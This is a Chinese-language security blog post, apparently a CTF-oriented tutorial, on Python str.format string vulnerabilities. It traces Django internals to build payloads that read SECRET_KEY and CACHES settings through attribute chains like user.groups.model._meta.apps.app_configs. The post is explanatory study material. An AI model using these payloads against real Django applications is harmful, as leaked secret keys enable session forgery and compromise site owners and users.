@@ -1,0 +1,751 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/gc.jpg">
+  <link rel="icon" href="/img/gc.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="fru1ts">
+  <meta name="keywords" content="fru1ts">
+  
+    <meta name="description" content="格式化字符串漏洞举例 https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;57309024 12345678config &#x3D; &amp;#123;&amp;#x27;SECRET_KEY&amp;#x27;: &amp;#x27;f0ma7_t3st&amp;#x27;&amp;#125;class User(object):    def __init__(self, name):        self.name &#x3D; nameuse">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python格式化字符串漏洞">
+<meta property="og:url" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="fru1ts&#39; Blog">
+<meta property="og:description" content="格式化字符串漏洞举例 https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;57309024 12345678config &#x3D; &amp;#123;&amp;#x27;SECRET_KEY&amp;#x27;: &amp;#x27;f0ma7_t3st&amp;#x27;&amp;#125;class User(object):    def __init__(self, name):        self.name &#x3D; nameuse">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/7.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.jpg">
+<meta property="og:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.jpg">
+<meta property="article:published_time" content="2023-11-23T08:51:09.000Z">
+<meta property="article:modified_time" content="2024-09-27T11:54:39.571Z">
+<meta property="article:author" content="fru1ts">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.jpg">
+  
+  
+  
+  <title>python格式化字符串漏洞 - fru1ts&#39; Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mouse.css">
+<link rel="stylesheet" href="/css/scroll.css">
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"fru1ts.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","app_key":"PSBkctB8cKrR97yZLNXnJ0nj","server_url":"https://wedmocok.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.11.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>fru1ts&#39; Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="python格式化字符串漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-23 08:51" pubdate>
+          November 23, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> views
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">python格式化字符串漏洞</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    Last updated on September 27, 2024 am
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="格式化字符串漏洞举例"><a class="markdownIt-Anchor" href="#格式化字符串漏洞举例"></a> 格式化字符串漏洞举例</h3>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/57309024">https://zhuanlan.zhihu.com/p/57309024</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">config = &#123;<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-string">&#x27;f0ma7_t3st&#x27;</span>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        self.name = name<br><br>user=User(<span class="hljs-string">&#x27;fru1ts&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello &#123;name&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name=user.__class__.__init__.__globals__))<br></code></pre></td></tr></table></figure>
+<p>两种导致格式化字符串的形式</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-string">&quot;test %s&quot;</span> <span class="hljs-meta">%</span> <span class="hljs-comment">(&#x27;test&#x27;)</span><br><span class="hljs-string">&quot;test &#123;0&#125;&quot;</span>.format<span class="hljs-comment">(&#x27;test&#x27;)</span><br></code></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/hongriSec/CTF-Training/tree/master/2018/%E7%99%BE%E8%B6%8A%E6%9D%AF2018/Web">https://github.com/hongriSec/CTF-Training/tree/master/2018/百越杯2018/Web</a></p>
+<ul>
+<li>
+<p>格式化字符串漏洞只有只读属性没有执行属性，可以利用格式化字符串中的“获取对象属性”、“获取数组数值”等方法来寻找、取得一些敏感信息。</p>
+</li>
+<li>
+<p>format函数无法执行__subclasses__()这样的方法，直接把这种payload套进格式化字符串的利用中会报错type object ‘object’ has no attribute ‘<strong>subclasses</strong>()’</p>
+</li>
+</ul>
+<h3 id="django下的格式化字符串漏洞"><a class="markdownIt-Anchor" href="#django下的格式化字符串漏洞"></a> Django下的格式化字符串漏洞</h3>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.toutiao.com/article/6798379120028811780/">https://www.toutiao.com/article/6798379120028811780/</a></p>
+<p>p神给了两条payload</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.app_config</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.settings</span>.SECRET_KEY&#125;<br>&#123;user<span class="hljs-selector-class">.user_permissions</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.app_config</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.admin</span><span class="hljs-selector-class">.settings</span>.SECRET_KEY&#125;<br></code></pre></td></tr></table></figure>
+<p>但是如果<code>admin</code>，<code>config.</code>等被过滤了就不能了利用了，所以需要通过分析payload如何构成，才能使用其他类进行替换。</p>
+<p>1.<code>user</code>是一个<code>AnonymousUser</code>类，通过在Django库中搜索找到<code>AnonymousUser</code>的定义</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/1.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>2.<code>group</code>属性有两种获取方式<code>_group</code>，<code>group</code>（通过<code> @property</code>将方法转换为属性）</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/2.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>3.<code>group</code>是一个<code>EmptyManager</code>对象，在库中搜索定义该类的文件，可以看到<code>model</code>属性，</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/3.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><code>_groups = EmptyManager(Group)</code>所以<code>Group</code>就是对应的<code>model</code></p>
+<p>4.跟进<code>Group</code>类的定义，其继承自<code>Model</code>，再跟进看到<code>Model</code>继承自<code>ModelBase</code></p>
+<p>5.在库中搜索<code>ModelBase</code>找到定义的位置</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/4.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>在121行可以看到该类的_meta属性是一个<code>Options</code>类实例化的对象</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/5.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>6.跟进到<code>Options</code>,<code>app_config</code>的定义如下</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/6.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>看到<code>app.app_configs</code>有6个可选的元素，也就是<code>app_config</code>可以用<code>app.app_configs[admin]</code> <code>app.app_configs[auth]</code> <code>app.app_configs[contenttypes]</code> <code>app.app_configs[sessions]</code> <code>app.app_configs[messages]</code> <code>app.app_configs[staticfiles]</code>替换</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/7.jpg" srcset="/img/loading.gif" lazyload class="">
+<p><code>app_config</code>等价于<code>apps.app_configs.get(self.app_label)</code>，其中128行有<code>self.apps = self.default_apps</code>,73行有<code>default_apps = apps</code>,跟进<code>apps</code>,发现是一个<code>Apps</code>的类。</p>
+<p>7.在库中搜索<code>Apps</code>类的定义</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/8.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>在97行有<code>self.app_configs[app_config.label] = app_config</code>,而91行有<code>app_config = AppConfig.create(entry)</code></p>
+<p>8.跟进到<code>AppConfig</code>类，这个对象有一个<code>module</code>属性是python的一个模块即<code>module</code>。</p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/9.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>9.第6步用什么替换需要最后能够找到含有<code>from django.conf import settings</code>的文件（用于读配置信息）</p>
+<p>例如：用<code>admin</code>,然后在<code>/django/contrib/admin</code>文件中查找<code>from django.conf import settings</code></p>
+<img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/10.jpg" srcset="/img/loading.gif" lazyload class=""><img src="/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/11.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>找到的这里文件都是可以利用的</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[admin]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.checkers</span><span class="hljs-selector-class">.settings</span>.SECRET_KEY&#125;<br></code></pre></td></tr></table></figure>
+<p><code>SECRET_KEY</code>可以更改为替他配置信息。</p>
+<p>贴几个找好的payload</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[auth]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.checks</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[auth]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.middleware</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[sessions]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.middleware</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[messages]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.middleware</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br>&#123;user<span class="hljs-selector-class">.groups</span><span class="hljs-selector-class">.model</span>._meta<span class="hljs-selector-class">.apps</span><span class="hljs-selector-class">.app_configs</span><span class="hljs-selector-attr">[staticfiles]</span><span class="hljs-selector-class">.module</span><span class="hljs-selector-class">.finders</span><span class="hljs-selector-class">.settings</span>.CACHES&#125;<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <p class="note note-warning">
+                <strong>本文作者: </strong><a href="/">fru1ts</a> <br>
+                <strong>本文链接: </strong><a href="https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">https://fru1ts.github.io/2023/11/23/python%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</a> <br>
+                <strong>版权声明: </strong>本站均采用BY-SA协议，除特别声明外，转载请注明出处!
+                   </p>
+                   
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/05/mysql%E6%8F%90%E6%9D%83/" title="mysql提权">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">mysql提权</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/28/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="python反序列化">
+                        <span class="hidden-mobile">python反序列化</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"WEdmoCOkNdSUMsONpu72ngCo-gzGzoHsz","appKey":"PSBkctB8cKrR97yZLNXnJ0nj","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        Total number of visits 
+        <span id="leancloud-site-pv"></span>
+         
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        Total number of visitors 
+        <span id="leancloud-site-uv"></span>
+         
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
